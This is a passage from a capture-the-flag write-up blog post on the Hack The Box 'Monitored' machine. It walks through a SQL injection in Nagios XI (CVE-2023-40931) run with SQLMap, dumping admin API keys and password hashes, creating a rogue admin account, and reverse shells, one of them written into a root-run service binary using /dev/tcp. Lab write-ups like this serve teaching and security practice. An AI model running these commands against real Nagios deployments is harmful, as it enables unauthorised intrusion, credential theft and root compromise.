        <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="nf">main</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
</code></pre></div></div>

<p>We are filtering it out any messages that contain <code class="language-plaintext highlighter-rouge">No API Key provided</code> string and printing the ones with a different message.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python fetch-req-msg.py https://nagios.monitored.htb/nagiosxi/api/v1/ api-endpoints.txt 
Message <span class="o">{</span><span class="s2">"error"</span>:<span class="s2">"No request was made"</span><span class="o">}</span>
 at endpoint https://nagios.monitored.htb/nagiosxi/api/v1/0

Message <span class="o">{</span><span class="s2">"error"</span>:<span class="s2">"You can only use POST with authenticate."</span><span class="o">}</span>
 at endpoint https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
</code></pre></div></div>

<p>We note an authentication endpoint present that does not require an API key. After a bit of research, I’ve found <a href="https://support.nagios.com/forum/viewtopic.php?f=16&amp;t=58783">this</a> topic on this endpoint, where it states that we can authenticate via cURL using 
<code class="language-plaintext highlighter-rouge">curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&amp;password=YOURPASS&amp;valid_min=5'</code>. We can try to authenticate and retrieve an API key with the credentials we found using snmpwalk:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-XPOST</span> <span class="nt">-k</span> <span class="nt">-L</span> <span class="s1">'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1'</span> <span class="nt">-d</span> <span class="s1">'username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=1000'</span>
<span class="o">{</span>
    <span class="s2">"username"</span>: <span class="s2">"svc"</span>,
    <span class="s2">"user_id"</span>: <span class="s2">"2"</span>,
    <span class="s2">"auth_token"</span>: <span class="s2">"080377be1a39ccd6c8126a03a3248e9046a1e6dd"</span>,
    <span class="s2">"valid_min"</span>: 1000,
    <span class="s2">"valid_until"</span>: <span class="s2">"Wed, 17 Jan 2024 12:57:22 -0500"</span>
<span class="o">}</span>
</code></pre></div></div>

<p>And we have our API token! Now, we can attempt to abuse CVE-2023-40931 and try to retrieve the administrator’s password or other sensitive information. Taking a look at the CVE, we see that the affected endpoint is <code class="language-plaintext highlighter-rouge">/nagiosxi/admin/banner_message-ajaxhelper.php</code> and we must send a POST request. With BurpSuite, this becomes easy:</p>

<p><img src="../figs/monitored5.png" alt="SQLi endpoint request" /></p>

<p>Ok, session has timed out means we are not authenticated anymore. I’ve tried to pass the authentication token as an Authentication header, but that did not work. I’ve also tried to send it in the body of the request with the names <code class="language-plaintext highlighter-rouge">auth_token</code> and <code class="language-plaintext highlighter-rouge">token</code>, that 
did not work either. Finally, after some attempts, I’ve tried to change the request to a GET request, and this happened:</p>

<p><img src="../figs/monitored6.png" alt="SQLi endpoint request" /></p>

<p>Alright! We are getting somewhere. I’ve tried a simple SQL injection in the ID parameter: <code class="language-plaintext highlighter-rouge">id=3'XOR(if(now()=sysdate(),sleep(5*5),0))OR'</code> and the response was intriguing:</p>

<p><img src="../figs/monitored7.png" alt="SQLi endpoint request" /></p>

<p>Amazing! It seems we might have a SQL injection here. Let’s run SQLMap to test it. One thing I noticed though is that the auth_token can only be used once per request. This means we will need a command to pass a different auth_token for every SQLMap request. To do so, we’ll use this <code class="language-plaintext highlighter-rouge">curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=500" | awk -F'"' '{print$12}'</code> command to clean the output to just be the token itself, and then run SQLMap with <code class="language-plaintext highlighter-rouge">-T xi_users</code>, which is the table in Nagios XI that contains users information.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>sqlmap <span class="nt">-u</span> <span class="s2">"https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=</span><span class="sb">`</span>curl <span class="nt">-ksX</span> POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate <span class="nt">-d</span> <span class="s2">"username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=500"</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'"'</span> <span class="s1">'{print$12}'</span><span class="sb">`</span><span class="s2">"</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">-p</span> <span class="nb">id</span> <span class="nt">--batch</span> <span class="nt">-D</span> nagiosxi <span class="nt">--dump</span> <span class="nt">-T</span> xi_users
        ___
       __H__                                                                                                             
 ___ ___[<span class="o">)]</span>_____ ___ ___  <span class="o">{</span>1.7.12#stable<span class="o">}</span>                                                                                
|_ -| <span class="nb">.</span> <span class="o">[</span>.]     | .<span class="s1">'| . |                                                                                                
|___|_  [(]_|_|_|__,|  _|                                                                                                
      |_|V...       |_|   https://sqlmap.org                                                                             

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 22:38:17 /2024-01-16/

<span class="o">[</span>22:38:17] <span class="o">[</span>INFO] testing connection to the target URL
you have not declared cookie<span class="o">(</span>s<span class="o">)</span>, <span class="k">while </span>server wants to <span class="nb">set </span>its own <span class="o">(</span><span class="s1">'nagiosxi=sncb97hqvcq...s60dv5asic'</span><span class="o">)</span><span class="nb">.</span> Do you want to use those <span class="o">[</span>Y/n] Y
<span class="o">[</span>22:38:18] <span class="o">[</span>INFO] checking <span class="k">if </span>the target is protected by some kind of WAF/IPS
<span class="o">[</span>22:38:18] <span class="o">[</span>INFO] testing <span class="k">if </span>the target URL content is stable
<span class="o">[</span>22:38:19] <span class="o">[</span>INFO] target URL content is stable
<span class="o">[</span>22:38:20] <span class="o">[</span>INFO] heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test </span>shows that GET parameter <span class="s1">'id'</span> might be injectable <span class="o">(</span>possible DBMS: <span class="s1">'MySQL'</span><span class="o">)</span>
<span class="o">[</span>22:38:20] <span class="o">[</span>INFO] testing <span class="k">for </span>SQL injection on GET parameter <span class="s1">'id'</span>
it looks like the back-end DBMS is <span class="s1">'MySQL'</span><span class="nb">.</span> Do you want to skip <span class="nb">test </span>payloads specific <span class="k">for </span>other DBMSes? <span class="o">[</span>Y/n] Y
<span class="o">[</span>22:38:20] <span class="o">[</span>INFO] testing <span class="s1">'AND boolean-based blind - WHERE or HAVING clause'</span>
<span class="o">[</span>22:38:20] <span class="o">[</span>WARNING] reflective value<span class="o">(</span>s<span class="o">)</span> found and filtering out
<span class="o">[</span>...snip...]
Database: nagiosxi
Table: xi_users
<span class="o">[</span>2 entries]
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | <span class="nv">$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C</span> | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 0            | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 0              | 1701427555           |
| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | <span class="nv">$2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK</span> | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1705449034   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 8              | 1699697433           |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
</code></pre></div></div>

<p>And we found the administrator’s API key and password. Using <a href="https://www.tunnelsup.com/hash-analyzer/">Hash Analyzer</a> we can see that the password is using bcrypt hash. I’ve tried to find a match with John The Ripper, but with no success. So this got me thinking… Maybe we can use the administrator API key to create another admin account within Nagios XI, then log in with it.
Again, with a bit research, we can find <a href="https://support.nagios.com/forum/viewtopic.php?f=16&amp;t=42923">this</a> topic, where it says
we can create an accout with this cURL command <code class="language-plaintext highlighter-rouge">curl -XPOST "http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=LTltbjobR0X3V5ViDIitYaI8hjsjoFBaOcWYukamF7oAsD8lhJRvSPWq8I3PjTf7&amp;pretty=1" -d "username=jmcdouglas&amp;password=test&amp;name=Jordan%20McDouglas&amp;email=jmcdouglas@localhost"</code>. However, this will create a normal user. We need an admin user. Then, I found (this)[https://www.exploit-db.com/exploits/44969] on exploit-db, which is a completely different exploit, but has these lines:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">def</span> <span class="nf">try_add_admin</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">passwd</span><span class="p">)</span>
    <span class="n">vprint_status</span> <span class="sh">"</span><span class="s">STEP 3: trying to add admin user with key #{key}</span><span class="sh">"</span>
    <span class="n">res</span> <span class="o">=</span> <span class="nf">send_request_cgi</span><span class="p">({</span>
      <span class="sh">'</span><span class="s">uri</span><span class="sh">'</span><span class="o">=&gt;</span> <span class="sh">"</span><span class="s">/nagiosxi/api/v1/system/user</span><span class="sh">"</span><span class="p">,</span>
      <span class="sh">'</span><span class="s">method</span><span class="sh">'</span> <span class="o">=&gt;</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">,</span>
      <span class="sh">'</span><span class="s">ctype</span><span class="sh">'</span> <span class="o">=&gt;</span> <span class="sh">'</span><span class="s">application/x-www-form-urlencoded</span><span class="sh">'</span><span class="p">,</span>
      <span class="sh">'</span><span class="s">vars_get</span><span class="sh">'</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="sh">'</span><span class="s">apikey</span><span class="sh">'</span> <span class="o">=&gt;</span> <span class="n">key</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">pretty</span><span class="sh">'</span> <span class="o">=&gt;</span> <span class="mi">1</span>
      <span class="p">},</span>
      <span class="sh">'</span><span class="s">vars_post</span><span class="sh">'</span> <span class="o">=&gt;</span><span class="p">{</span>
        <span class="sh">'</span><span class="s">username</span><span class="sh">'</span>   <span class="o">=&gt;</span> <span class="n">username</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">password</span><span class="sh">'</span>   <span class="o">=&gt;</span> <span class="n">passwd</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">name</span><span class="sh">'</span>       <span class="o">=&gt;</span> <span class="nf">rand_text_alpha</span><span class="p">(</span><span class="nf">rand</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="mi">5</span><span class="p">),</span>
        <span class="sh">'</span><span class="s">email</span><span class="sh">'</span>      <span class="o">=&gt;</span><span class="sh">"</span><span class="s">#{username}@localhost</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">auth_level</span><span class="sh">'</span> <span class="o">=&gt;</span><span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">force_pw_change</span><span class="sh">'</span> <span class="o">=&gt;</span> <span class="mi">0</span>
      <span class="p">}</span>
    <span class="p">})</span>
</code></pre></div></div>

<p>Note that it tries to create/add an admin account, and it passes a parameter <code class="language-plaintext highlighter-rouge">auth_level=admin</code>. Let’s combine cURL with this information and try to create this admin account:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-k</span> <span class="nt">-L</span> <span class="nt">-XPOST</span> <span class="s2">"https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1"</span> <span class="nt">-d</span> <span class="s2">"username=mula&amp;password=mula&amp;name=mula&amp;email=mula@localhost&amp;auth_level=admin"</span>
<span class="o">{</span>
    <span class="s2">"success"</span>: <span class="s2">"User account mula was added successfully!"</span>,
    <span class="s2">"user_id"</span>: 6
<span class="o">}</span>
</code></pre></div></div>

<p>And now we try to login within the browser:</p>

<p><img src="../figs/monitored8.png" alt="login successful" /></p>

<p>Ok! Now we are inside Nagios XI and logged in as administrator:</p>

<p><img src="../figs/monitored9.png" alt="admin panel" /></p>

<p>After poking around the application and looking for its documentation, I stumbled upon <a href="https://documentation.sysaid.com/docs/configure-nagios-xi-integration">this</a> topic that explains how one can add and execute commands within Nagios XI. We need to configure a new command at Configure &gt; Core Config Manager &gt; Commands &gt; Add New and we are able to pass any command we like. Alright, let’s pass it a reverse shell then!</p>

<p><img src="../figs/monitored10.png" alt="admin panel" /></p>

<p>To run the command, we go to Services (left panel) &gt; Add New and inside the Check command dropdown input, we select rev_shell. Then we click on Run Check Command. Don’t forget to leave your netcat listening before hitting this button!</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4242
Connection from 10.129.37.52:54666
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>14645<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
nagios@monitored:~<span class="nv">$ </span><span class="nb">whoami
whoami
</span>nagios
nagios@monitored:~<span class="nv">$ </span><span class="nb">ls       
ls
</span>cookie.txt
user.txt
nagios@monitored:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
<span class="o">[</span>...redacted...]
</code></pre></div></div>

<p>Granting us the user shell.</p>

<h2 id="step-3---system-enumeration"><a href="#step3-crafting-the-attack"></a>Step 3 - System enumeration</h2>

<p>My first enumeration command was <code class="language-plaintext highlighter-rouge">sudo -l</code> and the output impressed me:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nagios@monitored:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>nagios on localhost:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User nagios may run the following commands on localhost:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/nagios start
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/nagios stop
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/nagios restart
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/nagios reload
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/nagios status
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/nagios checkconfig
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/npcd start
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/npcd stop
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/npcd restart
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/npcd reload
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/npcd status
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php <span class="k">*</span>
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php <span class="k">*</span>
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php <span class="k">*</span>
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh <span class="k">*</span>
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh <span class="k">*</span>
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh <span class="k">*</span>
</code></pre></div></div>

<p>So many different possibilities here! After looking at the <code class="language-plaintext highlighter-rouge">.sh</code> files, I’ve found that <code class="language-plaintext highlighter-rouge">manage_services.sh</code> was used to start, stop and check status of npcd. Here’s the output of npcd status:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nagios@monitored:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/nagiosxi/scripts/manage_services.sh status npcd
&lt;cal/nagiosxi/scripts/manage_services.sh status npcd
● npcd.service - Nagios Process Control Daemon
     Loaded: loaded <span class="o">(</span>/etc/systemd/system/npcd.service<span class="p">;</span> enabled<span class="p">;</span> vendor preset: enabled<span class="o">)</span>
     Active: active <span class="o">(</span>running<span class="o">)</span> since Tue 2024-01-16 17:29:58 EST<span class="p">;</span> 4h 1min ago
   Main PID: 727 <span class="o">(</span>npcd<span class="o">)</span>
      Tasks: 1 <span class="o">(</span>limit: 4661<span class="o">)</span>
     Memory: 276.0K
        CPU: 228ms
     CGroup: /system.slice/npcd.service
             └─727 /usr/local/nagios/bin/npcd <span class="nt">-f</span> /usr/local/nagios/etc/pnp/npcd.cfg
</code></pre></div></div>

<p>As we can see, the <code class="language-plaintext highlighter-rouge">npcd.service</code> calls <code class="language-plaintext highlighter-rouge">/usr/share/nagios/bin/npcd</code> when running. But we also have write privileges on this directory and in the file:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nagios@monitored:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /usr/local/nagios/bin
<span class="nb">ls</span> <span class="nt">-la</span> /usr/local/nagios/bin
total 2192
drwxr-xr-x 2 nagios nagios    4096 Nov  9 10:43 <span class="nb">.</span>
drwxr-xr-x 8 root   root      4096 Nov  9 10:40 ..
<span class="nt">-rwxrwxr--</span> 1 nagios nagios  717648 Nov  9 10:40 nagios
<span class="nt">-rwxrwxr--</span> 1 nagios nagios   43648 Nov  9 10:40 nagiostats
<span class="nt">-rwxrwxr--</span> 1 nagios nagios 1043688 Nov  9 10:42 ndo.so
<span class="nt">-rwxr-xr-x</span> 1 root   root      1083 Nov  9 10:42 ndo-startup-hash.sh
<span class="nt">-rwxr-xr--</span> 1 nagios nagios   31584 Nov  9 10:42 npcd
<span class="nt">-rwxr-xr--</span> 1 nagios nagios   14552 Nov  9 10:42 npcdmod.o
<span class="nt">-rwxr-xr-x</span> 1 root   root    215488 Nov  9 10:43 nrpe
<span class="nt">-rwxr-xr-x</span> 1 root   root     10661 Nov  9 10:43 nrpe-uninstall
<span class="nt">-rwxr-xr-x</span> 1 root   root    142920 Nov  9 10:43 nsca
</code></pre></div></div>

<p>This means that we could erase the contents of <code class="language-plaintext highlighter-rouge">npcd</code> binary and replace it with a reverse shell. If this succeeds, we might get root.</p>

<h2 id="-getting-root"><a href="#solving"></a> Getting root</h2>

<p>Let’s try it out! First, we need to stop the service in order to be able to alter the file’s content:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nagios@monitored:/usr/local/nagios/bin<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
&lt;<span class="nb">local</span>/nagiosxi/scripts/manage_services.sh stop npcd
nagios@monitored:/usr/local/nagios/bin<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> npcd
<span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> npcd
nagios@monitored:/usr/local/nagios/bin<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'#!/bin/bash'</span> <span class="o">&gt;</span> npcd
<span class="nb">echo</span> <span class="s1">'#!/bin/bash'</span> <span class="o">&gt;</span> npcd
nagios@monitored:/usr/local/nagios/bin<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.200/9000 0&gt;&amp;1'"</span> <span class="o">&gt;&gt;</span> npcd
&lt;ash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.10.10/9000 0&gt;&amp;1<span class="s1">'" &gt;&gt; npcd
nagios@monitored:/usr/local/nagios/bin$ cat npcd
cat npcd
#!/bin/bash
bash -c '</span>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.10.10/9000 0&gt;&amp;1<span class="s1">'
</span></code></pre></div></div>

<p>We successfully overwritten the npcd binary. Now, we start another netcat on port 9000 and start the service back again with <code class="language-plaintext highlighter-rouge">sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd</code> to get the root shell:</p>

<p><img src="../figs/monitored11.png" alt="root-shell" /></p>

<h1 id="conclusion"><a href="#conclusions"></a>Conclusion</h1>

<p>This was a nice ride. Lots of rabbit holes along the way, but lots of new things learned. We were able to find our way in the website by first using snmpwalk which leaked some unprivileged user credentials. With these, we were able to create authentication tokens at <code class="language-plaintext highlighter-rouge">/nagiosxi/api/v1/authenticate</code> endpoint, which were then used to test a SQL injection at <code class="language-plaintext highlighter-rouge">/nagiosxi/admin/banner_message-ajaxhelper.php</code> endpoint. With SQLMap, we were able to retrieve the administrator API key, which was used to create a new admin account under Nagios XI. Then, this newly created admin account provided us the opportunity to run a reverse shell within Nagios XI commands, granting us the user shell.</p>

<p>From there, we simply listed all sudo commands that we could run without a password to find one that used service running from a binary that we had written permissions. We added our second reverse shell payload into it, restarted the service, and got the root shell.</p>

<p>Simply amazing!</p>

<p>I hope you liked this write-up and learned something new. As always, don’t forget to do your <strong>research!</strong></p>

<p><a href="/">Go back</a></p>


</article>
      </section>
    </div>
  </div>

   <footer>
  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
    <span>
        <b>Alex Buschinelli</b>
    </span>
    
    <span>© 2024</span>
  </a>
</footer>

  
</body>

</html>